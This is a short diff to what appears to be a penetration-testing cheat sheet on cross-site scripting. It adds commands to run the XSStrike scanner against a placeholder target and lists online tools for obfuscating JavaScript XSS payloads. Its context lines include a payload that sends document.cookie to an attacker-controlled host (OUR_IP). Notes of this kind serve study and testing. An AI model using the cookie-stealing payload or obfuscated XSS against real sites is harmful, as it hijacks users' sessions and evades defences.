@@ -27,6 +27,14 @@
 
 ---
 
+## Detect XSS
+```bash
+git clone https://github.com/s0md3v/XSStrike.git
+cd XSStrike
+pip install -r requirements.txt
+python xsstrike.py
+python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
+```
 
 ## Basic
 ```
@@ -106,3 +114,18 @@ php -S 0.0.0.0:80
 ```
 document.location='http://OUR_IP/index.php?c='+document.cookie;
 ```
+
+---
+
+## Deserialization + XSS
+
+https://www.toptal.com/developers/javascript-minifier
+https://beautifytools.com/javascript-obfuscator.php#
+https://obfuscator.io/legacy-playground
+
+### JS Obfuscated XSS:
+https://jsfuck.com/ 
+https://utf-8.jp/public/jjencode.html
+https://utf-8.jp/public/aaencode.html
+
+Test obfuscated code in: https://jsconsole.com/
